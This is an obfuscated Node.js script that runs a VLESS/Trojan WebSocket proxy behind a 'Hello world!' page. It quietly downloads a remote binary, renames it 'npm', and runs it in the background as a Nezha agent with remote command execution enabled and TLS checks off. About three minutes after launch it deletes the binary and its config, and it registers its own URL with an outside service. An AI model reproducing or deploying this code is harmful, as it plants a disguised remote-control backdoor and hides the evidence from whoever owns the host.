const _0x32d0ac=_0x499e;(function(_0xbe4df5,_0x54e12c){const _0xeb2c77=_0x499e,_0x50caf0=_0xbe4df5();while(!![]){try{const _0x4c8ce3=parseInt(_0xeb2c77(0x217))/0x1*(-parseInt(_0xeb2c77(0x249))/0x2)+parseInt(_0xeb2c77(0x1e1))/0x3*(-parseInt(_0xeb2c77(0x228))/0x4)+-parseInt(_0xeb2c77(0x1e0))/0x5*(-parseInt(_0xeb2c77(0x1f0))/0x6)+parseInt(_0xeb2c77(0x231))/0x7*(-parseInt(_0xeb2c77(0x1ff))/0x8)+-parseInt(_0xeb2c77(0x21a))/0x9+-parseInt(_0xeb2c77(0x1df))/0xa*(parseInt(_0xeb2c77(0x1f6))/0xb)+parseInt(_0xeb2c77(0x1fd))/0xc;if(_0x4c8ce3===_0x54e12c)break;else _0x50caf0['push'](_0x50caf0['shift']());}catch(_0x23c2f6){_0x50caf0['push'](_0x50caf0['shift']());}}}(_0x232f,0x5bf19));const os=require('os'),http=require(_0x32d0ac(0x233)),fs=require('fs'),axios=require(_0x32d0ac(0x234)),net=require(_0x32d0ac(0x20c)),path=require('path'),crypto=require(_0x32d0ac(0x230)),{Buffer}=require(_0x32d0ac(0x225)),{exec,execSync}=require(_0x32d0ac(0x1e5)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x32d0ac(0x222)][_0x32d0ac(0x20e)]||_0x32d0ac(0x1db),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x32d0ac(0x222)][_0x32d0ac(0x1ec)]||'',NEZHA_KEY=process[_0x32d0ac(0x222)][_0x32d0ac(0x212)]||'',DOMAIN=process[_0x32d0ac(0x222)][_0x32d0ac(0x24a)]||_0x32d0ac(0x1e2),AUTO_ACCESS=process[_0x32d0ac(0x222)]['AUTO_ACCESS']||!![],WSPATH=process[_0x32d0ac(0x222)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x32d0ac(0x222)][_0x32d0ac(0x239)]||_0x32d0ac(0x24d),NAME=process[_0x32d0ac(0x222)][_0x32d0ac(0x24f)]||'Hxl',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x216f27=_0x32d0ac;try{const _0x4d9f60=await axios[_0x216f27(0x23d)]('https://speed.cloudflare.com/meta'),_0x51e1bd=_0x4d9f60[_0x216f27(0x245)];ISP=(_0x51e1bd[_0x216f27(0x1e4)]+'-'+_0x51e1bd[_0x216f27(0x1e9)])[_0x216f27(0x23f)](/ /g,'_');}catch(_0x155cc4){ISP=_0x216f27(0x250);}};GetISP();const httpServer=http[_0x32d0ac(0x251)]((_0x2ea40f,_0x1bc8e5)=>{const _0x541858=_0x32d0ac;if(_0x2ea40f[_0x541858(0x227)]==='/'){const _0x135337=path['join'](__dirname,'index.html');fs[_0x541858(0x223)](_0x135337,_0x541858(0x241),(_0x2a3544,_0x290e6b)=>{const _0x16e8d5=_0x541858;if(_0x2a3544){_0x1bc8e5['writeHead'](0xc8,{'Content-Type':_0x16e8d5(0x238)}),_0x1bc8e5[_0x16e8d5(0x220)](_0x16e8d5(0x1ef));return;}_0x1bc8e5[_0x16e8d5(0x226)](0xc8,{'Content-Type':_0x16e8d5(0x238)}),_0x1bc8e5[_0x16e8d5(0x220)](_0x290e6b);});return;}else{if(_0x2ea40f[_0x541858(0x227)]==='/'+SUB_PATH){const _0x4f2bdb=_0x541858(0x22d)+UUID+'@'+DOMAIN+_0x541858(0x247)+DOMAIN+_0x541858(0x20d)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x24aa35=_0x541858(0x252)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x541858(0x20d)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x441c73=_0x4f2bdb+'\x0a'+_0x24aa35,_0x5cc2ce=Buffer[_0x541858(0x214)](_0x441c73)[_0x541858(0x1fe)]('base64');_0x1bc8e5[_0x541858(0x226)](0xc8,{'Content-Type':_0x541858(0x1dd)}),_0x1bc8e5[_0x541858(0x220)](_0x5cc2ce+'\x0a');}else _0x1bc8e5[_0x541858(0x226)](0x194,{'Content-Type':_0x541858(0x1dd)}),_0x1bc8e5[_0x541858(0x220)](_0x541858(0x22e));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x32d0ac(0x23f)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x32d0ac(0x216)];function resolveHost(_0x39b775){return new Promise((_0x2a1289,_0x41e321)=>{const _0x4a4be3=_0x499e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4a4be3(0x20f)](_0x39b775)){_0x2a1289(_0x39b775);return;}let _0x545b69=0x0;function _0xae5766(){const _0x19c7de=_0x4a4be3;if(_0x545b69>=DNS_SERVERS['length']){_0x41e321(new Error(_0x19c7de(0x232)+_0x39b775+_0x19c7de(0x210)));return;}const _0x85b712=DNS_SERVERS[_0x545b69];_0x545b69++;const _0x4b489d='https://dns.google/resolve?name='+encodeURIComponent(_0x39b775)+_0x19c7de(0x209);axios['get'](_0x4b489d,{'timeout':0x1388,'headers':{'Accept':_0x19c7de(0x1ea)}})['then'](_0x41ba53=>{const _0x109046=_0x19c7de,_0x367a90=_0x41ba53['data'];if(_0x367a90['Status']===0x0&&_0x367a90[_0x109046(0x243)]&&_0x367a90[_0x109046(0x243)]['length']>0x0){const _0x215abe=_0x367a90[_0x109046(0x243)]['find'](_0x4a7d36=>_0x4a7d36[_0x109046(0x23c)]===0x1);if(_0x215abe){_0x2a1289(_0x215abe[_0x109046(0x245)]);return;}}_0xae5766();})['catch'](_0x1cb4ba=>{_0xae5766();});}_0xae5766();});}function handleVlessConnection(_0x357e35,_0x35e88a){const _0x56b841=_0x32d0ac,[_0x100e48]=_0x35e88a,_0x59b77d=_0x35e88a[_0x56b841(0x21e)](0x1,0x11);if(!_0x59b77d['every']((_0x1f0d37,_0x58c724)=>_0x1f0d37==parseInt(uuid[_0x56b841(0x1f3)](_0x58c724*0x2,0x2),0x10)))return![];let _0x1ba655=_0x35e88a[_0x56b841(0x21e)](0x11,0x12)['readUInt8']()+0x13;const _0x5ef51c=_0x35e88a[_0x56b841(0x21e)](_0x1ba655,_0x1ba655+=0x2)['readUInt16BE'](0x0),_0x7ca2fa=_0x35e88a['slice'](_0x1ba655,_0x1ba655+=0x1)[_0x56b841(0x1e8)](),_0x37093e=_0x7ca2fa==0x1?_0x35e88a[_0x56b841(0x21e)](_0x1ba655,_0x1ba655+=0x4)[_0x56b841(0x1f4)]('.'):_0x7ca2fa==0x2?new TextDecoder()['decode'](_0x35e88a[_0x56b841(0x21e)](_0x1ba655+0x1,_0x1ba655+=0x1+_0x35e88a[_0x56b841(0x21e)](_0x1ba655,_0x1ba655+0x1)[_0x56b841(0x1e8)]())):_0x7ca2fa==0x3?_0x35e88a['slice'](_0x1ba655,_0x1ba655+=0x10)[_0x56b841(0x24e)]((_0x2bc120,_0xb46943,_0x5b598e,_0x1b7176)=>_0x5b598e%0x2?_0x2bc120['concat'](_0x1b7176[_0x56b841(0x21e)](_0x5b598e-0x1,_0x5b598e+0x1)):_0x2bc120,[])['map'](_0x29f2a2=>_0x29f2a2[_0x56b841(0x21d)](0x0)[_0x56b841(0x1fe)](0x10))[_0x56b841(0x1f4)](':'):'';_0x357e35[_0x56b841(0x246)](new Uint8Array([_0x100e48,0x0]));const _0xf14438=createWebSocketStream(_0x357e35);return resolveHost(_0x37093e)[_0x56b841(0x1f9)](_0x3bd00a=>{const _0x23db60=_0x56b841;net['connect']({'host':_0x3bd00a,'port':_0x5ef51c},function(){const _0x1b5a65=_0x499e;this[_0x1b5a65(0x206)](_0x35e88a[_0x1b5a65(0x21e)](_0x1ba655)),_0xf14438['on']('error',()=>{})[_0x1b5a65(0x1de)](this)['on'](_0x1b5a65(0x244),()=>{})[_0x1b5a65(0x1de)](_0xf14438);})['on'](_0x23db60(0x244),()=>{});})[_0x56b841(0x23a)](_0x36f410=>{const _0x5991ef=_0x56b841;net[_0x5991ef(0x1f8)]({'host':_0x37093e,'port':_0x5ef51c},function(){const _0x51b218=_0x5991ef;this[_0x51b218(0x206)](_0x35e88a[_0x51b218(0x21e)](_0x1ba655)),_0xf14438['on'](_0x51b218(0x244),()=>{})[_0x51b218(0x1de)](this)['on'](_0x51b218(0x244),()=>{})[_0x51b218(0x1de)](_0xf14438);})['on'](_0x5991ef(0x244),()=>{});}),!![];}function handleTrojanConnection(_0x35d765,_0x53ead3){const _0x2bcc58=_0x32d0ac;try{if(_0x53ead3[_0x2bcc58(0x1ee)]<0x3a)return![];const _0x12de3f=_0x53ead3['slice'](0x0,0x38)['toString'](),_0x3d4a32=[UUID];let _0x124ad4=null;for(const _0x15b06d of _0x3d4a32){const _0x1f595a=crypto[_0x2bcc58(0x204)]('sha224')[_0x2bcc58(0x1fa)](_0x15b06d)[_0x2bcc58(0x205)]('hex');if(_0x1f595a===_0x12de3f){_0x124ad4=_0x15b06d;break;}}if(!_0x124ad4)return![];let _0x42907e=0x38;_0x53ead3[_0x42907e]===0xd&&_0x53ead3[_0x42907e+0x1]===0xa&&(_0x42907e+=0x2);const _0x22f0a8=_0x53ead3[_0x42907e];if(_0x22f0a8!==0x1)return![];_0x42907e+=0x1;const _0x403493=_0x53ead3[_0x42907e];_0x42907e+=0x1;let _0x1a655f,_0x241680;if(_0x403493===0x1)_0x1a655f=_0x53ead3[_0x2bcc58(0x21e)](_0x42907e,_0x42907e+0x4)[_0x2bcc58(0x1f4)]('.'),_0x42907e+=0x4;else{if(_0x403493===0x3){const _0x49a6c8=_0x53ead3[_0x42907e];_0x42907e+=0x1,_0x1a655f=_0x53ead3[_0x2bcc58(0x21e)](_0x42907e,_0x42907e+_0x49a6c8)[_0x2bcc58(0x1fe)](),_0x42907e+=_0x49a6c8;}else{if(_0x403493===0x4)_0x1a655f=_0x53ead3[_0x2bcc58(0x21e)](_0x42907e,_0x42907e+0x10)[_0x2bcc58(0x24e)]((_0x3fe6c4,_0x516855,_0x353c81,_0x30709b)=>_0x353c81%0x2?_0x3fe6c4[_0x2bcc58(0x1e6)](_0x30709b[_0x2bcc58(0x21e)](_0x353c81-0x1,_0x353c81+0x1)):_0x3fe6c4,[])[_0x2bcc58(0x24b)](_0x20526f=>_0x20526f[_0x2bcc58(0x21d)](0x0)[_0x2bcc58(0x1fe)](0x10))[_0x2bcc58(0x1f4)](':'),_0x42907e+=0x10;else return![];}}_0x241680=_0x53ead3[_0x2bcc58(0x21d)](_0x42907e),_0x42907e+=0x2;_0x42907e<_0x53ead3[_0x2bcc58(0x1ee)]&&_0x53ead3[_0x42907e]===0xd&&_0x53ead3[_0x42907e+0x1]===0xa&&(_0x42907e+=0x2);const _0x46d279=createWebSocketStream(_0x35d765);return resolveHost(_0x1a655f)['then'](_0x40b18f=>{const _0x3e25ca=_0x2bcc58;net[_0x3e25ca(0x1f8)]({'host':_0x40b18f,'port':_0x241680},function(){const _0x52b0dd=_0x3e25ca;_0x42907e<_0x53ead3[_0x52b0dd(0x1ee)]&&this[_0x52b0dd(0x206)](_0x53ead3[_0x52b0dd(0x21e)](_0x42907e)),_0x46d279['on'](_0x52b0dd(0x244),()=>{})[_0x52b0dd(0x1de)](this)['on']('error',()=>{})[_0x52b0dd(0x1de)](_0x46d279);})['on'](_0x3e25ca(0x244),()=>{});})[_0x2bcc58(0x23a)](_0x37612f=>{const _0x3c5f24=_0x2bcc58;net[_0x3c5f24(0x1f8)]({'host':_0x1a655f,'port':_0x241680},function(){const _0x10f915=_0x3c5f24;_0x42907e<_0x53ead3['length']&&this[_0x10f915(0x206)](_0x53ead3[_0x10f915(0x21e)](_0x42907e)),_0x46d279['on'](_0x10f915(0x244),()=>{})[_0x10f915(0x1de)](this)['on'](_0x10f915(0x244),()=>{})[_0x10f915(0x1de)](_0x46d279);})['on']('error',()=>{});}),!![];}catch(_0x2bb6f8){return![];}}wss['on'](_0x32d0ac(0x236),(_0x57cbbd,_0x40b603)=>{const _0x187da9=_0x32d0ac,_0x12a1e1=_0x40b603['url']||'';_0x57cbbd[_0x187da9(0x202)](_0x187da9(0x215),_0x4994cd=>{const _0x3890eb=_0x187da9;if(_0x4994cd[_0x3890eb(0x1ee)]>0x11&&_0x4994cd[0x0]===0x0){const _0x1a9d6f=_0x4994cd['slice'](0x1,0x11),_0x10a782=_0x1a9d6f[_0x3890eb(0x201)]((_0x3ffbe6,_0x136533)=>_0x3ffbe6==parseInt(uuid[_0x3890eb(0x1f3)](_0x136533*0x2,0x2),0x10));if(_0x10a782){!handleVlessConnection(_0x57cbbd,_0x4994cd)&&_0x57cbbd[_0x3890eb(0x207)]();return;}}!handleTrojanConnection(_0x57cbbd,_0x4994cd)&&_0x57cbbd['close']();})['on'](_0x187da9(0x244),()=>{});});function _0x499e(_0x56c7d0,_0x2a2daf){const _0x232f12=_0x232f();return _0x499e=function(_0x499e87,_0x108362){_0x499e87=_0x499e87-0x1da;let _0x54c250=_0x232f12[_0x499e87];return _0x54c250;},_0x499e(_0x56c7d0,_0x2a2daf);}const getDownloadUrl=()=>{const _0x19ea5b=_0x32d0ac,_0x4c91aa=os[_0x19ea5b(0x208)]();return _0x4c91aa===_0x19ea5b(0x1f2)||_0x4c91aa===_0x19ea5b(0x22a)||_0x4c91aa===_0x19ea5b(0x1e7)?!NEZHA_PORT?_0x19ea5b(0x21f):_0x19ea5b(0x1ed):!NEZHA_PORT?_0x19ea5b(0x20b):_0x19ea5b(0x1eb);},downloadFile=async()=>{const _0x2060b8=_0x32d0ac;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3e1f6f=getDownloadUrl(),_0x172be6=await axios({'method':_0x2060b8(0x23d),'url':_0x3e1f6f,'responseType':_0x2060b8(0x1fc)}),_0x1ba63f=fs[_0x2060b8(0x229)](_0x2060b8(0x240));return _0x172be6[_0x2060b8(0x245)][_0x2060b8(0x1de)](_0x1ba63f),new Promise((_0x2c9c36,_0x3365f0)=>{const _0x2432f2=_0x2060b8;_0x1ba63f['on'](_0x2432f2(0x23e),()=>{const _0x4c6021=_0x2432f2;console[_0x4c6021(0x23b)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x119066=>{if(_0x119066)_0x3365f0(_0x119066);_0x2c9c36();});}),_0x1ba63f['on'](_0x2432f2(0x244),_0x3365f0);});}catch(_0x43319b){throw _0x43319b;}},runnz=async()=>{const _0x12ee90=_0x32d0ac;try{const _0x2f490a=execSync(_0x12ee90(0x1f5),{'encoding':'utf-8'});if(_0x2f490a[_0x12ee90(0x21c)]()!==''){console[_0x12ee90(0x23b)](_0x12ee90(0x21b));return;}}catch(_0xadc6d){}await downloadFile();let _0x401328='',_0x59e09f=[_0x12ee90(0x1fb),'8443','2096','2087','2083',_0x12ee90(0x1dc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a06d3=_0x59e09f[_0x12ee90(0x1f1)](NEZHA_PORT)?'--tls':'';_0x401328=_0x12ee90(0x242)+NEZHA_SERVER+':'+NEZHA_PORT+_0x12ee90(0x211)+NEZHA_KEY+'\x20'+_0x2a06d3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x228e15=NEZHA_SERVER[_0x12ee90(0x1f1)](':')?NEZHA_SERVER[_0x12ee90(0x218)](':')[_0x12ee90(0x248)]():'',_0x16e7a4=_0x59e09f['includes'](_0x228e15)?_0x12ee90(0x22f):_0x12ee90(0x221),_0x458898=_0x12ee90(0x20a)+NEZHA_KEY+_0x12ee90(0x22b)+NEZHA_SERVER+_0x12ee90(0x1e3)+_0x16e7a4+_0x12ee90(0x235)+UUID;fs['writeFileSync'](_0x12ee90(0x22c),_0x458898);}_0x401328=_0x12ee90(0x1da);}else{console[_0x12ee90(0x23b)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x401328,{'shell':'/bin/bash'},_0x4c6fdb=>{const _0x548530=_0x12ee90;if(_0x4c6fdb)console['error'](_0x548530(0x200),_0x4c6fdb);else console[_0x548530(0x23b)]('npm\x20is\x20running');});}catch(_0x40baef){console[_0x12ee90(0x244)](_0x12ee90(0x24c)+_0x40baef);}};async function addAccessTask(){const _0x155b5c=_0x32d0ac;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1d5f8e=_0x155b5c(0x1f7)+DOMAIN+'/'+SUB_PATH;try{const _0x29f673=await axios['post'](_0x155b5c(0x224),{'url':_0x1d5f8e},{'headers':{'Content-Type':_0x155b5c(0x213)}});console[_0x155b5c(0x23b)](_0x155b5c(0x237));}catch(_0x5c5ca4){}}const delFiles=()=>{const _0x37c4e6=_0x32d0ac;fs[_0x37c4e6(0x219)](_0x37c4e6(0x240),()=>{}),fs[_0x37c4e6(0x219)](_0x37c4e6(0x22c),()=>{});};httpServer['listen'](PORT,()=>{const _0x24d9da=_0x32d0ac;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x24d9da(0x23b)](_0x24d9da(0x203)+PORT);});function _0x232f(){const _0x1225c4=['1988919VZaupd','npm\x20is\x20already\x20running,\x20skip\x20running...','trim','readUInt16BE','slice','https://arm64.ssss.nyc.mn/v1','end','false','env','readFile','https://oooo.serv00.net/add-url','buffer','writeHead','url','2616RmyfBM','createWriteStream','arm64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','config.yaml','vless://','Not\x20Found\x0a','true','crypto','47803boAOHZ','Failed\x20to\x20resolve\x20','http','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','connection','Automatic\x20Access\x20Task\x20added\x20successfully','text/html','SUB_PATH','catch','log','type','get','finish','replace','npm','utf8','setsid\x20nohup\x20./npm\x20-s\x20','Answer','error','data','send',':443?encryption=none&security=tls&sni=','pop','40UVfzbL','DOMAIN','map','error:\x20','sub','reduce','NAME','Unknown','createServer','trojan://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','37275f5d-7132-427c-a1a9-373541416c3a','2053','text/plain','pipe','1310zrbqgL','1640rDtvRA','99jCfNQa','1234.abc.com','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country','child_process','concat','aarch64','readUInt8','asOrganization','application/dns-json','https://amd64.ssss.nyc.mn/agent','NEZHA_PORT','https://arm64.ssss.nyc.mn/agent','length','Hello\x20world!','11334FWXsql','includes','arm','substr','join','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','31251eiYvbi','https://','connect','then','update','443','stream','9724848LLdfWr','toString','472bkpvFS','npm\x20running\x20error:','every','once','Server\x20is\x20running\x20on\x20port\x20','createHash','digest','write','close','arch','&type=A','client_secret:\x20','https://amd64.ssss.nyc.mn/v1','net','&fp=chrome&type=ws&host=','UUID','test','\x20with\x20all\x20DNS\x20servers','\x20-p\x20','NEZHA_KEY','application/json','from','message','1.1.1.1','1787zjlybQ','split','unlink'];_0x232f=function(){return _0x1225c4;};return _0x232f();}
